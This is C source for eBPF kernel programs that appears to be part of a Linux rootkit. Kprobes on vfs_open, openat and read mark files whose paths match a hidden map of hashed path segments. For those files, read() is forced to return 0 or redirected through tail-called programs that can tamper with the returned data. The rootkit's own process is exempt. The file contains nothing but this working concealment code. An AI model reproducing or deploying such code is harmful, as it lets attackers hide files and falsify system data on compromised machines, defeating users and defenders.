#include <linux/kconfig.h>
#include <linux/ptrace.h>
#include <linux/types.h>
#include <linux/version.h>

#include "include/bpf.h"
#include "include/bpf_helpers.h"

#include "common.h"

static __attribute__((always_inline)) u64 get_fs_hash(struct dentry *dentry)
{
    struct inode *d_inode;
    bpf_probe_read(&d_inode, sizeof(d_inode), &dentry->d_inode);

    struct super_block *sb;
    bpf_probe_read(&sb, sizeof(sb), &d_inode->i_sb);

    struct file_system_type *type;
    bpf_probe_read(&type, sizeof(type), &sb->s_type);

    char *name_ptr;
    bpf_probe_read(&name_ptr, sizeof(name_ptr), &type->name);

    char name[32];
    bpf_probe_read_str(&name, sizeof(name), name_ptr);

    u64 hash = FNV_BASIS;
    update_hash_str(&hash, name);

    return hash;
}

static __attribute__((always_inline)) u64 get_file_attr(struct dentry *dentry)
{
    struct qstr qstr;
    struct dentry *d_parent;
    struct inode *d_inode = NULL;
    char name[MAX_SEGMENT_LENGTH + 1];
    int end = 0;

    struct rk_path_key_t key = {};

#pragma unroll
    for (int i = 0; i < 15; i++)
    {
        d_parent = NULL;
        bpf_probe_read(&d_parent, sizeof(d_parent), &dentry->d_parent);

        if (dentry != d_parent)
        {
            bpf_probe_read(&d_inode, sizeof(d_inode), &d_parent->d_inode);
        }

        bpf_probe_read(&qstr, sizeof(qstr), &dentry->d_name);
        bpf_probe_read_str(&name, sizeof(name), (void *)qstr.name);

        if (name[0] == '/' || name[0] == 0)
        {
            name[0] = '/';
            end = 1;
        }

        key.hash = FNV_BASIS;
        key.pos = i;

        update_hash_str(&key.hash, name);

        struct rk_path_attr_t *action = bpf_map_lookup_elem(&rk_path_keys, &key);
        if (!action)
        {
            return 0;
        }
        else if (action->action)
        {
            if (!action->fs_hash || action->fs_hash == get_fs_hash(dentry))
            {
                return action->action;
            }
        }

        if (end)
            return 0;

        dentry = d_parent;
    }

    return 0;
}

SEC("kprobe/vfs_open")
int _vfs_open(struct pt_regs *ctx)
{
    u64 pid_tgid = bpf_get_current_pid_tgid();

    u64 pid;
    LOAD_CONSTANT("rk_pid", pid);

    if (pid == pid_tgid >> 32)
    {
        return 0;
    }

    struct path *path = (struct path *)PT_REGS_PARM1(ctx);

    struct dentry *dentry;
    bpf_probe_read(&dentry, sizeof(dentry), &path->dentry);

    u64 action = get_file_attr(dentry);
    if (!action)
    {
        return 0;
    }

    struct rk_file_t file = {
        .action = action};
    bpf_map_update_elem(&rk_files, &pid_tgid, &file, BPF_ANY);

    return 0;
}

SEC("kretprobe/__x64_sys_openat")
int __x64_sys_openat_ret(struct pt_regs *ctx)
{
    u64 pid_tgid = bpf_get_current_pid_tgid();
    struct rk_file_t *file = (struct rk_file_t *)bpf_map_lookup_elem(&rk_files, &pid_tgid);
    if (!file)
    {
        return 0;
    }

    struct rk_fd_key_t fd_key =
        {
            .fd = (u64)PT_REGS_RC(ctx),
            .pid = pid_tgid >> 32,
        };

    struct rk_fd_attr_t fd_attr = {
        .action = file->action,
    };
    bpf_map_update_elem(&rk_fd_attrs, &fd_key, &fd_attr, BPF_ANY);

    return 0;
}

SEC("kprobe/__x64_sys_read")
int kprobe_sys_read(struct pt_regs *ctx)
{
    struct pt_regs *rctx = (struct pt_regs *)PT_REGS_PARM1(ctx);

    int fd;
    bpf_probe_read(&fd, sizeof(fd), &PT_REGS_PARM1(rctx));

    u64 pid_tgid = bpf_get_current_pid_tgid();
    struct rk_fd_key_t fd_key =
        {
            .fd = fd,
            .pid = pid_tgid >> 32,
        };

    struct rk_fd_attr_t *fd_attr = (struct rk_fd_attr_t *)bpf_map_lookup_elem(&rk_fd_attrs, &fd_key);
    if (!fd_attr)
    {
        return 0;
    }

    if (fd_attr->action == OVERRIDE_RETURN_0_ACTION)
    {
        bpf_override_return(ctx, 0);
    }

    void *buf = NULL;
    bpf_probe_read(&buf, sizeof(buf), &PT_REGS_PARM2(rctx));

    fd_attr->read_buf = buf;

    struct rk_file_t file = {
        .fd = fd,
        .action = fd_attr->action,
    };
    bpf_map_update_elem(&rk_files, &pid_tgid, &file, BPF_ANY);

    return 0;
}

SEC("kretprobe/__x64_sys_read")
int __x64_sys_read_ret(struct pt_regs *ctx)
{
    u64 pid_tgid = bpf_get_current_pid_tgid();
    struct rk_file_t *file = (struct rk_file_t *)bpf_map_lookup_elem(&rk_files, &pid_tgid);
    if (!file)
    {
        return 0;
    }

    bpf_tail_call(ctx, &read_ret_progs, file->action);

    return 0;
}

char _license[] SEC("license") = "GPL";
__u32 _version SEC("version") = 0xFFFFFFFE;
